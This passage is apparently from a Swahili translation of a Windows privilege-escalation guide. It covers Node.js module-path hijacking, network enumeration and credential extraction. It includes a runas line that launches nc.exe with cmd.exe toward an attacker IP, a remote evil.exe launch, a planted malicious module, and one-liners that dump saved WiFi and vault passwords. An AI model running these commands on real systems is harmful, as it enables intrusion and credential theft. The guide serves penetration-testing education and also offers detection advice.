for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Kwa maelezo zaidi kuhusu jinsi ya kutumia vibaya ukaguzi huu:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Utekaji nyara wa utatuzi wa module za Node.js / Electron kupitia `C:\node_modules`

Hii ni aina ya **Windows uncontrolled search path** inayoathiri programu za **Node.js** na **Electron** zinapofanya import isiyo na njia kamili kama `require("foo")` na module inayotarajiwa **haipo**.<sup>[[20]](#references)</sup>

Node hutafuta package kwa kupitia juu kwenye mti wa saraka na kuangalia folda za `node_modules` katika kila saraka ya mzazi. Kwenye Windows, utafutaji huo unaweza kufika kwenye mzizi wa drive, kwa hiyo programu iliyoanzishwa kutoka `C:\Users\Administrator\project\app.js` inaweza kujaribu kutafuta katika:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ikiwa **mtumiaji mwenye ruhusa ndogo** anaweza kuunda `C:\node_modules`, anaweza kuweka `foo.js` hasidi (au folda ya package) na kusubiri **mchakato wa Node/Electron wenye ruhusa za juu** ujaribu kutatua dependency inayokosekana. Payload hutekelezwa katika muktadha wa usalama wa mchakato lengwa, kwa hiyo hali hii husababisha **LPE** kila mara lengwa linapoendeshwa kama administrator, kupitia scheduled task/service wrapper iliyopandishwa ruhusa, au kwenye programu ya desktop yenye ruhusa za juu inayojiwasha kiotomatiki.

Hili hutokea mara nyingi hasa wakati:

- dependency imetajwa katika `optionalDependencies`<sup>[[22]](#references)</sup>
- library ya mtu mwingine imezungushia `require("foo")` kwa `try/catch` na kuendelea inaposhindwa
- package imeondolewa kwenye build za production, imeachwa wakati wa packaging, au imeshindwa kusakinishwa
- `require()` iliyo hatarini iko ndani kabisa ya mti wa dependency badala ya kuwa kwenye msimbo mkuu wa programu

### Kutafuta malengo yaliyo hatarini

Tumia **Procmon** kuthibitisha njia ya utatuzi:<sup>[[23]](#references)</sup>

- Weka kichujio cha `Process Name` = executable lengwa (`node.exe`, EXE ya programu ya Electron, au mchakato wa wrapper)
- Weka kichujio cha `Path` `contains` `node_modules`
- Lenga `NAME NOT FOUND` na ufunguzi wa mwisho uliofanikiwa chini ya `C:\node_modules`

Miundo ya msimbo inayofaa kukaguliwa kwenye faili za `.asar` zilizofunguliwa au vyanzo vya programu:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Tambua **jina la kifurushi kinachokosekana** kupitia Procmon au ukaguzi wa source.
2. Unda directory ya root lookup ikiwa bado haipo:

```powershell
mkdir C:\node_modules
```

3. Weka module yenye jina halisi linalotarajiwa:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Anzisha application ya mwathiriwa. Ikiwa application itajaribu `require("foo")` na module halali haipo, Node inaweza kupakia `C:\node_modules\foo.js`.

Mifano ya kwenye mifumo halisi ya modules za hiari zinazokosekana na zinazolingana na muundo huu ni pamoja na `bluebird` na `utf-8-validate`, lakini **mbinu** ndiyo sehemu inayoweza kutumika tena: tafuta **bare import** yoyote inayokosekana ambayo mchakato wa Windows Node/Electron wenye upendeleo utajaribu kuitatua.

### Mawazo ya kugundua na kuimarisha usalama

- Toa tahadhari mtumiaji anapounda `C:\node_modules` au kuandika faili/package mpya za `.js` humo.
- Tafuta michakato yenye integrity ya juu inayosoma kutoka `C:\node_modules\*`.
- Jumuisha dependencies zote za runtime kwenye production na kagua matumizi ya `optionalDependencies`.
- Kagua code ya wahusika wengine ili kutafuta mifumo ya kimyakimya ya `try { require("...") } catch {}`.
- Zima ukaguzi wa hiari ikiwa library inaruhusu (kwa mfano, baadhi ya deployments za `ws` zinaweza kuepuka ukaguzi wa legacy wa `utf-8-validate` kwa kutumia `WS_NO_UTF_8_VALIDATE=1`).

## Mtandao

### Shares

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### faili ya hosts

Angalia kama kuna kompyuta nyingine zinazojulikana zilizowekwa moja kwa moja kwenye faili ya hosts

```
type C:\Windows\System32\drivers\etc\hosts
```

### Violesura vya Mtandao na DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Porti Zilizo Wazi

Kagua **huduma zilizozuiwa** kutoka nje

```bash
netstat -ano #Opened ports?
```

Kwa listener ya ndani, linganisha PID yake na mmiliki wa process, njia ya executable, na service au scheduled task yoyote inayoianzisha. Service ya remote-control inaweza kutoa ufikiaji kama mtumiaji wa desktop yake tu ikiwa authentication na vidhibiti vya amri vinaruhusu. Custom TCP application inayoendeshwa chini ya akaunti yenye privileges za juu ni lengo tofauti la ukaguzi: listener na njia ya binary ni viashiria vya awali tu, ilhali njia ya memory-corruption iliyothibitishwa kupitia authentication inahitaji uchanganuzi wa binary hiyo mahususi na input inayoweza kufikiwa nayo. Ikiwa port iliyo wazi inaonekana kuwa ya system process, ilinganishe na [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) kabla ya kubaini backend service; forwarding rule pekee haithibitishi kuwa destination inaweza kufikiwa au ina hatari ya kushambuliwa.

### Jedwali la Uelekezaji

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Jedwali la ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Kanuni za Firewall

[**Angalia ukurasa huu kwa amri zinazohusiana na Firewall**](../basic-cmd-for-pentesters.md#firewall) **(orodhesha kanuni, unda kanuni, zima, zima...)**

Amri zaidi za uchunguzi wa mtandao [hapa](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` pia inaweza kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ukipata mtumiaji wa root, unaweza kusikiliza kwenye port yoyote (mara ya kwanza unapotumia `nc.exe` kusikiliza kwenye port, GUI itakuuliza ikiwa `nc` inapaswa kuruhusiwa na firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Ili kuanzisha bash kama root kwa urahisi, unaweza kujaribu `--default-user root`

Unaweza kuchunguza mfumo wa faili wa `WSL` kwenye folda ya `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Kuwa root ya Linux ndani ya WSL pekee hakukupi haki za Windows Administrator. Ikiwa utambulisho wa sasa wa Windows unaweza kusoma mfumo wa faili wa usambazaji, kagua faili za historia ya shell (ikiwemo `/root/.bash_history`) kwa amri ambazo huenda zilihifadhi credentials; kupandisha haki bado kunahitaji akaunti halali yenye haki za juu na njia ya uthibitishaji iliyoruhusiwa. Muundo wa `LocalState\rootfs` unatumika kwa usakinishaji wa zamani wa WSL; WSL 2 kwa kawaida huhifadhi usambazaji kwenye diski pepe ya [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), kwa hiyo tambua kwanza usambazaji halisi na njia ya hifadhi. Epuka kuchapisha maudhui ya historia wakati wa uorodheshaji wa kiotomatiki.

## Vitambulisho vya Windows

### Vitambulisho vya Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Treat `DefaultUserName` na `DefaultDomainName` kama muktadha wa akaunti, si credentials. Thamani isiyo tupu ya `DefaultPassword` au `AltDefaultPassword` ni ugunduzi wa plaintext kwenye registry. Ikiwa `AutoAdminLogon=1` lakini hakuna nenosiri la plaintext linalosomeka, hilo ni kidokezo tu: [Sysinternals Autologon inaweza kuhifadhi nenosiri kama LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), na usomaji wa kawaida wa registry hauwezi kuthibitisha kama secret hiyo ipo au inaweza kurejeshwa. Kagua haki za ufikiaji na usanidi halisi wa logon kabla ya kuripoti kufichuka kwa credential.

### Kidhibiti cha credentials / Windows vault

Kutoka [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault huhifadhi credentials za watumiaji kwa seva, tovuti na programu nyingine ambazo **Windows** inaweza kutumia **kuingia watumiaji kiotomatiki**. Mwanzoni, inaweza kuonekana kana kwamba watumiaji wanaweza kuhifadhi credentials za tovuti kama Facebook, Twitter au Gmail na kufanya browser ziingie kiotomatiki, lakini sivyo inavyofanya kazi.

Windows Vault huhifadhi credentials ambazo Windows inaweza kutumia kuwaingiza watumiaji kiotomatiki. Hii inamaanisha kuwa **programu yoyote ya Windows inayohitaji credentials ili kufikia rasilimali** (seva au tovuti) **inaweza kutumia Credential Manager** na Windows Vault, kisha kutumia credentials zilizotolewa badala ya watumiaji kuingiza jina la mtumiaji na nenosiri kila mara.

Isipokuwa programu ziwasiliane na Credential Manager, sidhani kama zinaweza kutumia credentials za rasilimali fulani. Kwa hiyo, ikiwa programu yako inataka kutumia vault, inapaswa kwa namna fulani **kuwasiliana na credential manager na kuomba credentials za rasilimali hiyo** kutoka kwenye vault ya hifadhi ya msingi.

Tumia `cmdkey` kuorodhesha credentials zilizohifadhiwa kwenye mashine.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Kisha unaweza kutumia `runas` pamoja na chaguo la `/savecred` ili kutumia credentials zilizohifadhiwa. Mfano ufuatao unaita binary ya mbali kupitia share ya SMB.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Kutumia `runas` pamoja na seti ya credentials iliyotolewa.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Kumbuka kwamba mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), au kupitia [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Programu za kisasa za Windows UWP, Microsoft Edge, na huduma za kisasa za mfumo huhifadhi tokeni za uthibitishaji na nywila za maandishi wazi ndani ya `PasswordVault` ya Universal Windows Platform (UWP) (inayoonekana pia kama `Web Credentials` katika `vaultcmd`). Hifadhi hii imetengwa kwa kila session na inaweza kusimbuliwa kwa njia asilia bila haki za kiutawala au `SeDebugPrivilege`.

Tekeleza amri hii ya PowerShell ndani ya session inayotumika ya mtumiaji ili kutoa mara moja majina yote ya watumiaji yaliyohifadhiwa na kusimbua nywila zao za maandishi wazi:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** hutoa njia ya kusimba data kwa kutumia ufunguo linganifu, na hutumiwa zaidi ndani ya mfumo wa uendeshaji wa Windows kusimba funguo binafsi zisilingani. Usimbaji huu hutumia siri ya mtumiaji au mfumo ili kuongeza entropy kwa kiasi kikubwa.

**DPAPI huwezesha usimbaji wa funguo kupitia ufunguo linganifu unaotokana na siri za kuingia za mtumiaji**. Katika hali zinazohusisha usimbaji wa mfumo, hutumia siri za uthibitishaji wa domain za mfumo.

Funguo za RSA za mtumiaji zilizosimbwa kwa kutumia DPAPI huhifadhiwa kwenye saraka ya `%APPDATA%\Microsoft\Protect\{SID}`, ambapo `{SID}` inawakilisha [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) ya mtumiaji. **Ufunguo wa DPAPI, ambao huhifadhiwa pamoja na ufunguo mkuu unaolinda funguo binafsi za mtumiaji ndani ya faili hiyo hiyo**, kwa kawaida huwa na data nasibu ya baiti 64. (Ni muhimu kutambua kwamba ufikiaji wa saraka hii umezuiwa, hivyo haiwezekani kuorodhesha yaliyomo kwa kutumia amri ya `dir` katika CMD, ingawa yanaweza kuorodheshwa kupitia PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Unaweza kutumia **mimikatz module** `dpapi::masterkey` pamoja na hoja zinazofaa (`/pvk` au `/rpc`) ili kuisimbua.

**Faili za credentials zinazolindwa na master password** kwa kawaida hupatikana katika:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

You can use **mimikatz module** `dpapi::cred` with the appropriate `/masterkey` to decrypt.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Vitambulisho vya PowerShell

**Vitambulisho vya PowerShell** hutumiwa mara nyingi katika kazi za **scripting** na automation kama njia rahisi ya kuhifadhi credentials zilizosimbwa kwa njia fiche. Credentials hulindwa kwa kutumia **DPAPI**, ambayo kwa kawaida humaanisha kwamba zinaweza kudecyptiwa tu na mtumiaji huyo huyo kwenye kompyuta ileile ambako ziliundwa.

Credential iliyohamishwa inaweza kuwa na jina lolote la faili au njia ya `.xml`. Script au orodha ya faili ikielekeza kwenye faili moja, tafuta saraka halisi ya profile ya akaunti badala ya kudhani kuwa ipo kwenye `C:\Users`: [Windows can place profiles elsewhere](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Faili inayosomeka ni kidokezo tu; [Windows `Export-Clixml` binds an encrypted credential to the exporting user and computer](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), na akaunti yoyote iliyopatikana lazima pia iwe na ruhusa halali kwenye service inayolengwa. Kagua njia za faili na ACL kwanza, bila kuchapisha thamani zilizosimbwa au maandishi ya wazi wakati wa ukaguzi wa kawaida.

Ili **decrypt** credential za PS kutoka kwenye faili inayozihifadhi, unaweza kufanya hivi:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Miunganisho ya RDP Iliyohifadhiwa

Unaweza kuipata kwenye `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\  
na kwenye `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Amri Zilizotekelezwa Hivi Karibuni

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Kidhibiti cha Vitambulisho vya Remote Desktop**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Tumia module ya Mimikatz `dpapi::rdg` pamoja na `/masterkey` inayofaa ili **kusimbua faili zozote za .rdg**\
Unaweza **kutoa DPAPI masterkeys nyingi** kutoka kwenye kumbukumbu kwa kutumia module ya Mimikatz `sekurlsa::dpapi`

**mRemoteNG hutumia hifadhi tofauti ya miunganisho.** Kagua XML inayosomeka chini ya `%APPDATA%\mRemoteNG` na Documents za mtumiaji, ikijumuisha faili zenye majina ya kawaida kama `config.xml`. Tambua schema ya miunganisho na sifa za `Password` zilizosimbwa kabla ya kuichukulia faili ya XML kama kidokezo cha kupata credentials. Thamani iliyohifadhiwa si nenosiri la DPAPI/RDCMan; urejeshaji hutegemea mipangilio ya usimbaji ya faili na kama nenosiri maalum la master lilitumika. Epuka kuchapisha thamani zilizosimbwa wakati wa uorodheshaji wa jumla.

**Exports za profile za Remote Desktop Plus** pia zinaweza kusomeka katika saraka za mtumiaji au folda ya pamoja ya usimamizi. Export ya zamani ya `profiles.xml` ina maingizo ya `Data/Profile` yenye vipengele vya `ProfileName`, `Password` na `Secure`. Chukulia kipengele cha nenosiri kisicho tupu kama kidokezo cha kupata credentials, bila kukichapisha au kudhani kuwa ni plaintext: [maelezo ya mtengenezaji](https://www.donkz.nl/) yanasema kuwa ulinzi wa profile unaweza kufungamanishwa na akaunti na kompyuta iliyoiunda, au kusanidiwa kwa masharti yasiyo makali sana. Thibitisha chanzo cha faili na masharti ya urejeshaji kabla ya kuitumia.

### Sticky Notes

Watu wakati mwingine huhifadhi nywila na taarifa nyingine katika programu za sticky-note. Programu ya Sticky Notes ya Microsoft iliyosakinishwa kama kifurushi kwa kawaida huhifadhi madokezo kwenye `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; programu za zamani au tofauti zinaweza kutumia hifadhi nyingine za wasifu wa mtumiaji, ikijumuisha LevelDB. Tambua programu iliyosakinishwa na muundo wa hifadhi kabla ya kuhitimisha kuwa hakuna madokezo kwa sababu faili ya SQLite haipo.

Ikiwa Sticky Notes inatumia SQLite write-ahead logging, nakala ya `plum.sqlite` pekee inaweza kukosa madokezo yaliyohifadhiwa hivi karibuni. Hifadhi `plum.sqlite-wal` inayolingana pamoja na nakala thabiti ya hifadhidata, na ujumuishe `plum.sqlite-shm` ikiwa inapatikana; faharasa ya kumbukumbu ya pamoja inaweza kujengwa upya, lakini WAL ni sehemu ya hali endelevu ya hifadhidata. Tazama [nyaraka za WAL za SQLite](https://www.sqlite.org/wal.html). Dokezo lenye jina la akaunti au nenosiri ni kidokezo tu cha kupata credentials: thibitisha akaunti, ruhusa ya kuifikia, na matumizi ya nenosiri hilo kwenye akaunti nyingine kivyake. Rekodi iliyosimbwa ya password manager pia inahitaji ufunguo wake halisi wa usimbuaji na ufasiri mahususi wa programu kabla ya kuthibitisha kuingia kwenye akaunti yenye mamlaka ya juu zaidi.

### AppCmd.exe

**Kumbuka kuwa ili kurejesha nywila kutoka AppCmd.exe, unahitaji kuwa Administrator na kuendesha programu katika kiwango cha High Integrity.**\
**AppCmd.exe** iko katika saraka ya `%systemroot%\system32\inetsrv\`.\
Ikiwa faili hii ipo, inawezekana kwamba baadhi ya **credentials** zimesanidiwa na zinaweza **kurejeshwa**.

Msimbo huu umetolewa kutoka [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Angalia kama `C:\Windows\CCM\SCClient.exe` ipo .\
Installers **huendeshwa kwa SYSTEM privileges**, nyingi zinaweza kuathiriwa na **DLL Sideloading (Taarifa kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Faili na Registry (Credentials)

### Mabaki ya credentials za registry ya zana za usaidizi

Baadhi ya usakinishaji wa zamani wa remote-support huhifadhi majina ya thamani yanayohusiana na password chini ya funguo maalum za registry za programu. Kwa mfano, `SecurityPasswordAES` ya TeamViewer ilitambulisha password tuli ya session iliyosanidiwa katika matoleo ya kabla ya 9, kulingana na [maelezo ya vendor kuhusu ufunguo wa registry](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Alama ya jina la thamani ni kidokezo cha kuchunguza tu: thibitisha toleo lililosakinishwa, data ya thamani inayosomeka, format na tabia ya sasa ya authentication kabla ya kutathmini credential hiyo. Kuhama kutoka password ya remote-support kwenda akaunti ya Windows yenye ruhusa zaidi kunahitaji pia matumizi halisi ya password hiyo kwa akaunti hiyo na idhini ya kuitumia. Usijumuishe ciphertext au password zilizorejeshwa kwenye matokeo ya kawaida ya enumeration.

### Lahajedwali zilizoshirikiwa zenye laha zilizolindwa

Ikiwa kuna shaka kuwa workbook inayosomeka na kushirikiwa ina data ya akaunti, tofautisha **usimbaji fiche wa faili** na ulinzi wa worksheet au safu wima zilizofichwa. [Microsoft inasema](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) kuwa ulinzi wa worksheet hudhibiti uhariri na si kipengele cha usalama; peke yake haithibitishi kuwa yaliyomo kwenye workbook yamesimbwa fiche. Kagua faili zilizoidhinishwa na zinazohusika pekee, na epuka kuchapisha siri zinazoweza kuwepo wakati wa enumeration pana. Njia ya `.xlsx` inayosomeka, laha iliyolindwa, au safu wima iliyofichwa pekee haithibitishi kuwa credentials zipo au kwamba akaunti yoyote ina ruhusa za juu zaidi; thibitisha data yenyewe na haki za sasa za akaunti kando.

### Patch za mabadiliko zilizohifadhiwa na seva ya CI

Seva ya CI inaweza kuhifadhi mabadiliko ya source code yaliyowasilishwa kwenye saraka yake ya data hata baada ya build kukamilika. [TeamCity inaeleza](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) kuwa `system/changes` hutumika kuhifadhi mabadiliko ya remote-run; saraka ya data inaweza kusanidiwa na si lazima iwe chini ya `ProgramData`. Patch inayosomeka inaweza kuhifadhi marejeo yaliyoondolewa au kuongezwa kwa faili ya credential, ufunguo wa usimbaji fiche, au script inayotumia vyote viwili. Kwa mfano, workflow ya PowerShell `ConvertTo-SecureString -Key` inahitaji ufunguo wa AES pamoja na mfuatano uliosimbwa fiche; [Microsoft inaeleza](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) kuwa ufunguo hutolewa kivyake. Kagua majina ya patch zinazofikika pekee kwanza, kisha kagua yaliyomo yanayohusika kwa idhini bila kuchapisha siri kwenye matokeo ya kawaida ya enumeration. Njia ya patch, thamani iliyosimbwa fiche, au rejeo la ufunguo pekee havithibitishi credential halali au ufikiaji wa ruhusa za juu zaidi. Zuia ufikiaji wa ACL za saraka ya data na epuka kuweka siri kwenye mabadiliko ya build.

### Mzunguko maalum wa kubadilisha password ya local administrator

Kibadilisha password kilichotengenezwa nyumbani kinaweza kuhifadhi password iliyosimbwa fiche ya local administrator ndani ya huduma ya ndani, huku credentials za datastore yake zikiwa kwenye faili ya `.env` inayosomeka au kando ya binary ya updater. Kagua scheduled task ya updater, akaunti, ACL za usanidi, listener na ruhusa za datastore kwa pamoja. Datastore inayosikiliza loopback pekee bado inaweza kufikiwa na mtumiaji wa ndani mwenye credentials halali, lakini authentication peke yake haithibitishi ruhusa ya kusoma rekodi zinazohusika. Ikiwa seed ya usimbaji fiche au nyenzo ya ufunguo inapatikana kando ya ciphertext, kagua utaratibu halisi wa kutengeneza ufunguo kabla ya kuamini usimbaji fiche huo. Mbinu inayotengeneza ufunguo wa AES kwa namna ya kubainika kutokana na seed iliyo wazi kwa kutumia Go [`math/rand`](https://pkg.go.dev/math/rand) haifai kulinda password hiyo; Go inaeleza kuwa package hiyo haifai kwa randomness inayohitaji usalama. Thibitisha kuwa password yoyote iliyorejeshwa bado ni ya sasa na inamilikiwa na akaunti iliyo kwenye kundi la local Administrators kabla ya kuichukulia kama njia ya escalation. Scheduled task, njia ya `.env`, au blob iliyosimbwa fiche pekee havithibitishi masharti hayo. Usijumuishe password au nyenzo ya ufunguo kwenye matokeo ya kawaida ya enumeration.

Tumia [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) kusimamia password za local administrator. Hifadhi yake inayotegemea directory au Entra na vidhibiti vya ufikiaji ni tofauti na datastore maalum ya ndani; vivyo hivyo, [roles za Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) huamua kama mtumiaji aliye-authenticate wa datastore anaweza kusoma index maalum.

### JAR za plugin za seva ya Java na matumizi tena ya credentials

Baadhi ya plugin za seva za Java husambazwa kama archive za JAR kwenye saraka ya `plugins` ya seva. Plugin maalum inayosomeka inaweza kuwa na usanidi au bytecode iliyo na credential iliyopachikwa ya huduma. Kagua archive hiyo kwa idhini pekee na usijumuishe siri zilizorejeshwa kwenye matokeo ya kawaida ya enumeration. Njia ya plugin pekee haithibitishi kuwa siri ipo, na password ya huduma iliyorejeshwa husababisha ruhusa za juu zaidi ikiwa tu inatumika pia kwa akaunti yenye ruhusa zaidi. Kagua ACL za faili husika na ubadilishe credentials zilizotumika tena kwa siri tofauti. Tazama [mwongozo wa usakinishaji wa plugin wa PaperMC](https://docs.papermc.io/paper/adding-plugins/) kwa mpangilio wa saraka na [nyaraka za JAR za Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) kwa yaliyomo kwenye archive.

### Credentials za database iliyopachikwa ya Openfire

